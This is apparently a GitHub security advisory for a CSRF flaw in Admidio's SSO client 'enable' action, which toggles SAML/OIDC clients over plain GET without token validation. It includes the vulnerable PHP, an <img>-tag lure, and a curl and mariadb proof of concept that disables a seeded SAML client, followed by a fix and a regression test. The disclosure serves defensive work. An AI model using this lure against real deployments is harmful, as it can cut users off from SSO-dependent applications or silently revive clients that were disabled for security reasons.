# [M] Admidio: CSRF in SSO client `enable` action toggles SAML/OIDC clients without token validation

## Summary
Severity: Medium
Advisory: GHSA-xg76-5qj2-2hhv
CVE: CVE-2026-47229
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-xg76-5qj2-2hhv
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

`modules/sso/clients.php` validates an `adm_csrf_token` on every state-changing branch except `enable`. The `enable` case loads the SAML or OIDC client by UUID, calls `$client->enable($enabled)`, and persists the new state with no token check. Because the action is reachable via plain GET parameters, a third-party page can trick an authenticated administrator into disabling (or silently re-enabling) any configured SAML or OIDC client. Disabling an SSO client breaks every downstream relying-party application that authenticates through it.

## Details

### Vulnerable Code

`modules/sso/clients.php:84-115` — the file's other branches each begin with `SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);`, but `case 'enable':` does not:

```php
case 'delete_oidc':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $oidcService = new OIDCService($gDb, $gCurrentUser);
    $client = $oidcService->getClientFromUUID($getClientUUID);
    $client->delete();
    echo json_encode(array('status' => 'success'));
    break;

case 'enable':                                          // <- no CSRF validation
    $enabled = admFuncVariableIsValid($_GET, 'enabled', 'boolean');
    $client = new SAMLClient($gDb);
    $client->readDataByUuid($getClientUUID);
    if ($client->isNewRecord()) {
        // Not a SAML record, so try OIDC:
        $client = new OIDCClient($gDb);
        $client->readDataByUuid($getClientUUID);
    }
    if ($client->isNewRecord()) {
        throw new Exception('SYS_SSO_INVALID_CLIENT');
    }
    $client->enable($enabled);
    $client->save();
    echo json_encode(['success' => true]);
    break;
```

The `enable($enabled)` call is documented to set a single boolean column on the SAML / OIDC client row — `smc_enabled` for SAML, `ocl_enabled` for OIDC — and `save()` persists the change immediately. The handler accepts plain GET (`admFuncVariableIsValid($_GET, 'enabled', 'boolean')`), so a `<img src=...>` or auto-submitting form is sufficient.

### Exploitation Flow

1. Attacker prepares a hostile page that loads (e.g.) `<img src="http://victim.example/modules/sso/clients.php?mode=enable&uuid=<known-sso-client-uuid>&enabled=0">`. The client UUID can be observed by anyone who has visited the SSO settings, by anyone who has crawled the SAML metadata endpoint, or by anyone with read access to the SSO clients table — but the value is also enumerable: an admin viewing the list of SSO clients in the UI exposes `data-uuid` attributes in the rendered HTML, and SSO metadata endpoints (e.g. `modules/sso/saml.php?metadata=1&uuid=...`) confirm valid UUIDs by returning XML.
2. An Admidio administrator visits the hostile page while logged in. The browser sends Admidio's session cookie (which does not set `SameSite=Strict`).
3. The server runs `case 'enable':` as the admin, sets `smc_enabled=0` (or `ocl_enabled=0`), and replies `{"success":true}`.
4. The configured SAML / OIDC client is now disabled. Every downstream application authenticating through it gets `SYS_SSO_INVALID_CLIENT` on its next AuthnRequest / token-endpoint call. The outage persists until an admin notices and toggles it back on.

The attacker can also flip the bit the other way: silently *re-enabling* a client that an admin had previously deactivated (perhaps because of a security concern with that relying party).

## PoC

Tested on HEAD `c5cde53`. To produce a deterministic test target, an SSO client is provisioned directly in the DB:

```
# 0. seed a SAML client
mariadb -h 127.0.0.1 -P 3399 -u admidio -p... admidio <<'SQL'
INSERT INTO adm_saml_clients (smc_uuid, smc_org_id, smc_client_name, smc_acs_url, smc_enabled,
                              smc_timestamp_create, smc_usr_id_create)
VALUES ('aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', 1, 'Test SAML', 'https://app.example/acs', 1,
        NOW(), 2);
SQL

mariadb ... admidio -e "SELECT smc_uuid, smc_client_name, smc_enabled FROM adm_saml_clients WHERE smc_client_name='Test SAML';"
smc_uuid                              smc_client_name  smc_enabled
aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee  Test SAML        1

# 1. CSRF lure — admin's browser, no token supplied, GET only
curl -b $admin_cookie -i \
  "http://127.0.0.1:8085/modules/sso/clients.php?mode=enable&uuid=aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee&enabled=0"
HTTP/1.1 200 OK
{"success":true}

# 2. observe the change
mariadb ... admidio -e "SELECT smc_enabled FROM adm_saml_clients WHERE smc_uuid='aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';"
smc_enabled
0
```

The change persists. The legitimate admin's UI continues to show the client as configured, but every SAML AuthnRequest fails until the bit is toggled back.

## Impact

In an Admidio deployment that uses SSO for downstream relying parties, a CSRF lure targeted at an administrator results in:

* **SSO outage** for whichever client UUID the attacker chose. Users who depend on `app1.example/sso` (or similar) cannot log in. The outage persists until a human admin notices and re-enables the client by hand.
* **Stealthy re-activation** of a client the admin had previously deactivated for a security reason — for example, a relying party whose certificate had been compromised — by passing `enabled=1` instead of `0`.

The impact is limited to the SAML / OIDC `_enabled` column; nothing else in the SSO state machine is mutated by this branch. Confidentiality is not affected. Availability is partial (`A:L`) because only one client at a time is hit, and only the SSO path of that client. Integrity is `I:L` because the `_enabled` bit is the only mutated column. `UI:R` reflects the admin-must-visit requirement; `PR:N` because the attacker needs no Admidio credentials of their own.

## Recommended Fix

Add the CSRF check and switch the trigger from GET to POST:

```php
case 'enable':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    }

    $enabled = admFuncVariableIsValid($_POST, 'enabled', 'boolean');
    $client = new SAMLClient($gDb);
    $client->readDataByUuid($getClientUUID);
    if ($client->isNewRecord()) {
        $client = new OIDCClient($gDb);
        $client->readDataByUuid($getClientUUID);
    }
    if ($client->isNewRecord()) {
        throw new Exception('SYS_SSO_INVALID_CLIENT');
    }
    $client->enable($enabled);
    $client->save();
    echo json_encode(['success' => true]);
    break;
```

Update the JS call site that drives the enable/disable toggle to POST the form's CSRF token (the page already renders `adm_csrf_token`).

A regression test should issue a `GET /modules/sso/clients.php?mode=enable&uuid=<x>&enabled=0` with an admin cookie but no token, and assert the response rejects the request and the client's `_enabled` column is unchanged.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-xg76-5qj2-2hhv
- https://github.com/Admidio/admidio
